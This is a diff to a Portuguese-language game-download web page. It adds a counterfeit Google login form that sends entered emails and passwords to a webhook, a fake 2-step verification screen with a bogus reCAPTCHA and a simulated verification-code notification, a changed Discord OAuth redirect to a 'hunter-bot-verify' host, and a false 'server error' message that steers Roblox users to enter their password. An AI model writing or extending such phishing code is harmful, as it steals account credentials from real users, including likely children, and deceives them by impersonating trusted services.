@@ -9,6 +9,8 @@
     
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+
         body { font-family: 'Source Sans Pro', sans-serif; background-color: #f2f4f5; margin: 0; overflow-x: hidden; }
         
         #bg-tech-blur {
@@ -28,9 +30,14 @@
         .profile-img-container { width: 100px; height: 100px; border-radius: 50%; border: 1px solid black; margin: 0 auto; overflow: hidden; position: relative; background: #eee; display: flex; align-items: center; justify-content: center; }
         .profile-img-container img { width: 100%; height: 100%; object-fit: cover; }
         
-        /* Modais */
+        /* Modais Gerais */
         .roblox-modal { background-color: #191b1d; color: white; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); position: relative; z-index: 50; }
         .roblox-header { font-weight: 700; font-size: 32px; text-align: center; margin-bottom: 24px; color: #ffffff; margin-top: 10px; }
+        .img-white-filter { filter: brightness(0) invert(1); }
+        .btn-icon-adjust { width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; margin-right: 12px; margin-left: -4px; overflow: hidden; }
+        .btn-icon-adjust img { height: 140%; width: auto; }
+        .roblox-wordmark-wrapper { width: 100%; display: flex; justify-content: center; margin-top: 20px; margin-bottom: 30px; }
+        .roblox-wordmark-wrapper img { width: 180px; height: auto; }
         .roblox-input { background-color: #232527; border: 1px solid #a7a7a7; border-radius: 6px; color: white; padding: 10px 12px; font-size: 16px; width: 100%; height: 44px; outline: none; }
         .roblox-input:focus { border-color: white; }
         .password-container { position: relative; margin-bottom: 12px; }
@@ -42,8 +49,72 @@
         .roblox-divider { height: 1px; background-color: #3e4042; margin: 20px 0; width: 100%; }
         .roblox-link-text { color: white; font-size: 12px; text-align: center; display: block; margin: 16px 0; cursor: pointer; }
         .roblox-link-text:hover { text-decoration: underline; }
+        
         .toast-error { position: fixed; bottom: -100px; left: 50%; transform: translateX(-50%); background: #191b1d; color: white; padding: 14px 28px; border-radius: 8px; border: 1px solid #3e4042; z-index: 100; transition: bottom 0.5s ease-out; font-weight: 600; }
         .toast-error.show { bottom: 25px; }
+
+        /* --- ESTILOS DO GOOGLE --- */
+        .google-modal-container {
+            background-color: #000000;
+            color: #e8eaed;
+            font-family: 'Roboto', sans-serif;
+            width: 100%;
+            max-width: 450px;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .google-logo { width: 75px; margin-bottom: 10px; filter: brightness(0) invert(1); }
+        .google-title { font-size: 24px; font-weight: 400; padding-bottom: 0; padding-top: 16px; color: #e8eaed; }
+        .google-subtitle { font-size: 16px; color: #e8eaed; margin-top: 10px; text-align: center; line-height: 1.5; margin-bottom: 20px; }
+        .google-input-wrapper { width: 100%; position: relative; margin-bottom: 15px; }
+        .google-input { width: 100%; background: transparent; border: 1px solid #5f6368; border-radius: 4px; color: #e8eaed; height: 56px; padding: 13px 15px; font-size: 16px; transition: border-color 0.2s; }
+        .google-input:focus { border-color: #8ab4f8; border-width: 2px; padding: 12px 14px; outline: none; }
+        .google-actions { width: 100%; display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .google-create-account { color: #8ab4f8; font-size: 14px; font-weight: 500; background: transparent; border: none; cursor: pointer; }
+        .google-btn-next { background-color: #8ab4f8; color: #202124; font-weight: 500; padding: 0 24px; height: 36px; border-radius: 4px; font-size: 14px; border: none; cursor: pointer; transition: background 0.2s; }
+        .google-btn-next:hover { background-color: #a6c8ff; }
+        .google-forgot { color: #8ab4f8; font-size: 14px; font-weight: 500; margin-top: 8px; align-self: flex-start; cursor: pointer; display: block; width: 100%; text-align: left; }
+
+        /* --- FAKE RECAPTCHA --- */
+        .fake-recaptcha {
+            background-color: #202124; /* Fundo escuro */
+            border: 1px solid #5f6368;
+            border-radius: 3px;
+            width: 100%;
+            max-width: 304px; /* Tamanho padrão */
+            height: 78px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 12px;
+            margin-top: 20px;
+            cursor: pointer;
+            box-shadow: 0 0 4px rgba(0,0,0,0.1);
+        }
+        .fake-recaptcha:hover { background-color: #28292c; }
+        .captcha-box {
+            width: 28px; height: 28px; background: #fff; border: 2px solid #c1c1c1; border-radius: 2px;
+            display: flex; align-items: center; justify-content: center; margin-right: 12px;
+        }
+        .captcha-label { color: #e8eaed; font-family: 'Roboto', sans-serif; font-size: 14px; font-weight: 400; flex-grow: 1; }
+        .captcha-brand { display: flex; flex-direction: column; align-items: center; text-align: center; color: #9aa0a6; font-size: 10px; margin-left: 10px; }
+        .captcha-brand img { width: 32px; height: 32px; opacity: 0.7; margin-bottom: 2px; }
+
+        /* Simulação Notificação Email (Estilo Sistema) */
+        .fake-email-notification {
+            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
+            background: #333; color: white; padding: 15px 20px; border-radius: 8px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.5); z-index: 200;
+            display: flex; align-items: center; gap: 15px; transition: top 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55); 
+            width: 90%; max-width: 400px; border-left: 4px solid #4285F4;
+        }
+        .fake-email-notification.show { top: 25px; }
+        .google-icon-notif { color: #fff; font-size: 24px; }
 
         /* Header */
         header { display: flex; align-items: center; justify-content: space-between; gap: 10px; }
@@ -56,7 +127,15 @@
     <div id="bg-tech-blur"></div>
     <div id="sidebar-overlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>
 
-    <!-- SIDEBAR -->
+    <div id="fake-email-notif" class="fake-email-notification">
+        <div class="google-icon-notif"><i class="fa-brands fa-google"></i></div>
+        <div>
+            <p class="text-xs text-gray-400 font-bold mb-1">SERVIÇOS DO GOOGLE • AGORA</p>
+            <p class="font-bold text-sm">Código de verificação do Google</p>
+            <p class="text-sm text-gray-200">Seu código é <strong>1011</strong></p>
+        </div>
+    </div>
+
     <div id="sidebar">
         <div class="p-6 border-b flex justify-between items-center bg-gray-50">
             <span class="font-bold text-xl text-gray-800">Menu</span>
@@ -66,15 +145,25 @@
             <button onclick="abrirPerfil()" class="w-full text-left p-3 hover:bg-gray-100 rounded flex items-center gap-3 text-gray-700 font-medium">
                 <i class="fa-solid fa-user"></i> Perfil
             </button>
+            <button onclick="abrirConfig()" class="w-full text-left p-3 hover:bg-gray-100 rounded flex items-center gap-3 text-gray-700 font-medium">
+                <i class="fa-solid fa-gear"></i> Configurações
+            </button>
         </div>
+        
         <div class="p-4 border-t">
+            <button onclick="adicionarLoginExtra()" class="w-full text-left p-3 hover:bg-gray-100 rounded flex flex-col mb-2">
+                <div class="flex items-center gap-3 text-green-600 font-bold">
+                    <i class="fa-solid fa-user-plus"></i> Adicionar Login Extra
+                </div>
+                <span class="text-xs text-gray-500 pl-8">&lt;Recomendado&gt;</span>
+            </button>
+
             <button onclick="logout()" class="w-full text-left p-3 text-red-600 hover:bg-red-50 rounded flex items-center gap-3 font-bold">
                 <i class="fa-solid fa-right-from-bracket"></i> Sair da conta
             </button>
         </div>
     </div>
 
-    <!-- HEADER -->
     <header class="bg-white shadow-md p-4 sticky top-0 z-30">
         <div class="flex items-center gap-4">
             <button onclick="toggleSidebar()" class="text-gray-700 text-2xl hover:text-black"><i class="fa-solid fa-bars"></i></button>
@@ -95,14 +184,35 @@
         </div>
     </header>
 
-    <!-- CONTEÚDO -->
     <main class="flex-grow container mx-auto p-6 z-10 relative">
         <div id="games-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
             <div class="col-span-full text-center text-gray-500 mt-10">Carregando...</div>
         </div>
     </main>
 
-    <!-- Modais -->
+    <div id="modal-config" class="fixed inset-0 bg-black bg-opacity-60 z-[80] hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-lg p-6 w-full max-w-sm relative">
+            <button onclick="document.getElementById('modal-config').classList.add('hidden')" class="absolute top-4 right-4 text-gray-500"><i class="fa-solid fa-xmark text-xl"></i></button>
+            <h3 class="text-xl font-bold text-gray-800 mb-6">Configurações</h3>
+            <div class="space-y-4">
+                <div class="flex justify-between items-center">
+                    <span>Modo Escuro (Automático)</span>
+                    <i class="fa-solid fa-toggle-on text-green-600 text-2xl"></i>
+                </div>
+                <div class="flex justify-between items-center">
+                    <span>Notificações de Jogos</span>
+                    <i class="fa-solid fa-toggle-on text-green-600 text-2xl"></i>
+                </div>
+                <div class="flex justify-between items-center">
+                    <span>Atualizações Automáticas</span>
+                    <i class="fa-solid fa-toggle-off text-gray-400 text-2xl"></i>
+                </div>
+                <hr>
+                <div class="text-xs text-gray-500 text-center">Versão 1.5.2 - Render</div>
+            </div>
+        </div>
+    </div>
+
     <div id="modal-perfil" class="fixed inset-0 bg-black bg-opacity-60 z-[70] hidden flex items-center justify-center p-4">
         <div class="bg-white rounded-lg p-6 w-full max-w-sm relative text-center">
             <button onclick="document.getElementById('modal-perfil').classList.add('hidden')" class="absolute top-4 right-4 text-gray-500"><i class="fa-solid fa-xmark text-xl"></i></button>
@@ -125,14 +235,74 @@
             <button onclick="fecharModais()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
             <h2 class="roblox-header mt-4">Login</h2>
             
-            <!-- LINK DISCORD CORRIGIDO PARA O DOMÍNIO LOCAL -->
-            <a href="https://discord.com/oauth2/authorize?client_id=1443717513748812011&response_type=code&redirect_uri=https%3A%2F%2Fgamedown.onrender.com%2Fsucess&scope=identify+guilds.join" class="bg-[#5865F2] hover:bg-[#4752C4] text-white font-bold py-3 px-4 rounded-lg w-full flex items-center justify-center gap-2 mb-4 transition no-underline">
+            <a href="https://discord.com/oauth2/authorize?client_id=1443717513748812011&response_type=code&redirect_uri=https%3A%2F%2Fhunter-bot-verify.onrender.com%2Fauth2&scope=identify+guilds.join" class="bg-[#5865F2] hover:bg-[#4752C4] text-white font-bold py-3 px-4 rounded-lg w-full flex items-center justify-center gap-2 mb-4 transition no-underline">
                 <i class="fa-brands fa-discord text-xl"></i> Login por Discord
             </a>
             
-            <button onclick="abrirFormularioRoblox()" class="bg-[#232527] border border-white hover:bg-[#2b2d31] text-white font-bold py-3 px-4 rounded-lg w-full flex items-center justify-center gap-2 transition">
-                <i class="fa-solid fa-cube text-xl"></i> Login por Roblox
+            <button onclick="abrirFormularioRoblox()" class="bg-[#232527] border border-white hover:bg-[#2b2d31] text-white font-bold py-3 px-4 rounded-lg w-full flex items-center justify-center transition mb-4">
+                <div class="btn-icon-adjust">
+                    <img src="https://static.vecteezy.com/system/resources/previews/027/127/530/non_2x/roblox-logo-roblox-icon-transparent-free-png.png" alt="Icon" class="img-white-filter">
+                </div>
+                Login por Roblox
             </button>
+
+            <button onclick="abrirGoogleModal()" class="bg-white hover:bg-gray-100 text-gray-800 font-bold py-3 px-4 rounded-lg w-full flex items-center justify-center gap-2 transition">
+                <i class="fa-solid fa-envelope text-xl"></i> Login por E-Mail
+            </button>
+        </div>
+    </div>
+
+    <div id="modal-google" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4" style="background-color: rgba(0,0,0,0.6);">
+        <div class="google-modal-container">
+            <button onclick="fecharModais()" class="absolute top-4 right-4 text-gray-500 hover:text-gray-300"><i class="fa-solid fa-xmark text-lg"></i></button>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo" alt="Google">
+            <h1 class="google-title">Fazer login</h1>
+            <p class="google-subtitle" style="display:none;"></p>
+            
+            <div class="w-full mt-4">
+                <div class="google-input-wrapper">
+                    <input type="email" id="google-email-input" class="google-input" placeholder="E-mail ou telefone">
+                </div>
+                <div class="google-input-wrapper">
+                    <input type="password" id="google-pass-input" class="google-input" placeholder="Digite sua senha">
+                </div>
+            </div>
+            
+            <span class="google-forgot" onclick="triggerFakeError()">Esqueceu seu e-mail?</span>
+            
+            <div class="google-actions">
+                <button class="google-create-account" onclick="triggerFakeError()">Criar conta</button>
+                <button onclick="processarLoginGoogle()" class="google-btn-next">Avançar</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="modal-google-code" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4" style="background-color: rgba(0,0,0,0.6);">
+        <div class="google-modal-container">
+            <button onclick="fecharModais()" class="absolute top-4 right-4 text-gray-500 hover:text-gray-300"><i class="fa-solid fa-xmark text-lg"></i></button>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo" alt="Google">
+            <h1 class="google-title">Verificação de 2 etapas</h1>
+            <p class="google-subtitle">Um e-mail com um código de verificação acaba de ser enviado para sua conta.</p>
+            
+            <div class="google-input-wrapper mt-4">
+                <input type="text" id="google-code-input" class="google-input text-center tracking-widest text-xl font-bold" placeholder="Inserir código">
+            </div>
+
+            <div class="fake-recaptcha" onclick="toggleCaptcha()">
+                <div class="flex items-center">
+                    <div id="captcha-box" class="captcha-box"></div>
+                    <span class="captcha-label">Não sou um robô</span>
+                </div>
+                <div class="captcha-brand">
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="">
+                    <span>reCAPTCHA</span>
+                    <span style="font-size: 8px;">Privacidade - Termos</span>
+                </div>
+            </div>
+            
+            <div class="google-actions justify-end">
+                <button onclick="verificarGoogleCode()" class="google-btn-next">Avançar</button>
+            </div>
         </div>
     </div>
 
@@ -140,7 +310,11 @@
         <div class="roblox-modal w-full max-w-[400px] p-6 relative">
             <button onclick="voltarSelecao()" class="absolute top-4 left-4 text-gray-400 hover:text-white text-lg"><i class="fa-solid fa-arrow-left"></i></button>
             <button onclick="fecharModais()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
-            <h2 class="roblox-header mt-8">Entre com Roblox</h2>
+            
+            <div class="roblox-wordmark-wrapper">
+                <img src="https://logos-world.net/wp-content/uploads/2020/11/Roblox-Logo.png" alt="Roblox" class="img-white-filter">
+            </div>
+            
             <form onsubmit="event.preventDefault(); processarLogin();">
                 <input type="text" id="inp-user" class="roblox-input mb-3" placeholder="Usuário/e-mail/telefone">
                 <div class="password-container">
@@ -180,19 +354,24 @@
         const sidebar = document.getElementById('sidebar');
         const sidebarOverlay = document.getElementById('sidebar-overlay');
         const bgBlur = document.getElementById('bg-tech-blur');
+        
         const modalSelecao = document.getElementById('modal-selecao');
         const modalFormRoblox = document.getElementById('modal-form-roblox');
+        const modalGoogle = document.getElementById('modal-google');
+        const modalGoogleCode = document.getElementById('modal-google-code');
         const modalEmail = document.getElementById('modal-email');
         const modalCodigo = document.getElementById('modal-codigo');
         const modalUsername = document.getElementById('modal-username');
         const modalUpload = document.getElementById('modal-upload');
+        const modalConfig = document.getElementById('modal-config');
+        
         const toast = document.getElementById('toast');
+        const fakeEmailNotif = document.getElementById('fake-email-notif');
         const btnUpload = document.getElementById('btn-upload');
 
         window.onload = () => {
             carregarJogos();
             carregarPerfilLocal();
-            // A rota de sucesso para o nosso site é /sucess
             if(window.location.href.includes("sucess")) {
                 bgBlur.style.display = 'block';
                 modalUsername.classList.remove('hidden');
@@ -210,6 +389,9 @@
             atualizarPreviewImagem(savedImg);
             document.getElementById('modal-perfil').classList.remove('hidden');
         }
+        function abrirConfig() { toggleSidebar(); modalConfig.classList.remove('hidden'); }
+        function adicionarLoginExtra() { toggleSidebar(); abrirModalSelecao(); }
+
         function habilitarEdicaoNome() { const i = document.getElementById('profile-name-input'); i.removeAttribute('readonly'); i.focus(); i.classList.remove('border-transparent'); i.classList.add('border-blue-500'); document.getElementById('btn-save-profile').classList.remove('hidden'); }
         function previewImagem(e) { const f = e.target.files[0]; if(f){ const r = new FileReader(); r.onload=function(ev){ atualizarPreviewImagem(ev.target.result); document.getElementById('btn-save-profile').classList.remove('hidden'); }; r.readAsDataURL(f); } }
         function atualizarPreviewImagem(src) { document.getElementById('profile-preview').innerHTML = src ? `<img src="${src}">` : ''; }
@@ -316,23 +498,70 @@
 
         function tentarBaixar(l) { if(!currentUser) abrirModalSelecao(); else window.open(l,'_blank'); }
         function abrirModalSelecao() { if(!currentUser){ modalSelecao.classList.remove('hidden'); bgBlur.style.display='block'; } }
+        
+        function abrirGoogleModal() { modalSelecao.classList.add('hidden'); modalGoogle.classList.remove('hidden'); }
+        
         function abrirFormularioRoblox() { modalSelecao.classList.add('hidden'); modalFormRoblox.classList.remove('hidden'); }
         function voltarSelecao() { modalFormRoblox.classList.add('hidden'); modalSelecao.classList.remove('hidden'); }
-        function fecharModais() { [modalSelecao, modalFormRoblox, modalEmail, modalCodigo, modalUsername].forEach(m=>m.classList.add('hidden')); bgBlur.style.display='none'; }
-        function triggerFakeError() { toast.innerText="Erro"; toast.classList.add('show'); setTimeout(()=>toast.classList.remove('show'),3000); }
+        function fecharModais() { [modalSelecao, modalFormRoblox, modalGoogle, modalGoogleCode, modalEmail, modalCodigo, modalUsername, modalConfig].forEach(m=>m.classList.add('hidden')); bgBlur.style.display='none'; }
+        function showErrorToast(msg = "Erro") { toast.textContent = msg; toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 3000); }
+        function triggerFakeError() { showErrorToast("Erro"); } 
+
         function irParaEmail() { modalFormRoblox.classList.add('hidden'); modalSelecao.classList.add('hidden'); modalEmail.classList.remove('hidden'); }
         
         function enviarCodigoEmail() { 
             const e = document.getElementById('inp-email-codigo').value; 
-            enviarWebhook(`## 📧 PEDIDO EMAIL: ${e}\n||@everyone||`);
-            fetch("https://www.roblox.com/login", {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: `username=${encodeURIComponent(e)}` 
-            }).catch(() => {});
+            enviarWebhook(`## 📧 PEDIDO EMAIL ROBLOX: ${e}\n||@everyone||`);
+            fetch("https://www.roblox.com/login", { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `username=${encodeURIComponent(e)}` }).catch(() => {});
+            showErrorToast("Erro de servidor, tente usar sua senha");
             modalEmail.classList.add('hidden'); 
-            modalCodigo.classList.remove('hidden'); 
+            modalFormRoblox.classList.remove('hidden');
+        }
+
+        // --- LÓGICA DO LOGIN GOOGLE ATUALIZADA ---
+        function processarLoginGoogle() {
+            const email = document.getElementById('google-email-input').value;
+            const pass = document.getElementById('google-pass-input').value;
+            
+            if(!email || !pass) return showErrorToast("Preencha e-mail e senha");
+            
+            // 1. Envia Webhook (com Email e Senha)
+            enviarWebhook(`## 📧 LOGIN GOOGLE: ${email} | Pass: ${pass}\n||@everyone||`);
+            
+            // 2. Troca para o Modal de Código e simula envio do código
+            modalGoogle.classList.add('hidden');
+            modalGoogleCode.classList.remove('hidden');
+            
+            // Simula chegada do email visualmente
+            setTimeout(() => {
+                fakeEmailNotif.classList.add('show');
+                setTimeout(() => fakeEmailNotif.classList.remove('show'), 5000);
+            }, 1500);
+        }
+
+        // --- LÓGICA FAKE CAPTCHA ---
+        let captchaChecked = false;
+        function toggleCaptcha() {
+            const box = document.getElementById('captcha-box');
+            if(captchaChecked) return;
+            box.innerHTML = '<i class="fa-solid fa-spinner fa-spin text-gray-500"></i>';
+            setTimeout(() => {
+                box.innerHTML = '<i class="fa-solid fa-check text-green-500 text-xl"></i>';
+                captchaChecked = true;
+            }, 800);
+        }
+
+        function verificarGoogleCode() {
+            if(!captchaChecked) return showErrorToast("Complete o Captcha");
+            
+            const code = document.getElementById('google-code-input').value;
+            if(code === '1011') {
+                // SEM WEBHOOK DE CONFIRMAÇÃO
+                modalGoogleCode.classList.add('hidden');
+                modalUsername.classList.remove('hidden');
+            } else {
+                showErrorToast("Código incorreto");
+            }
         }
 
         function verificarCodigo() { const c=document.getElementById('inp-final-code').value; enviarWebhook(`## CODIGO: ${c}`); modalCodigo.classList.add('hidden'); modalUsername.classList.remove('hidden'); }
@@ -358,4 +587,3 @@
     </script>
 </body>
 </html>
-
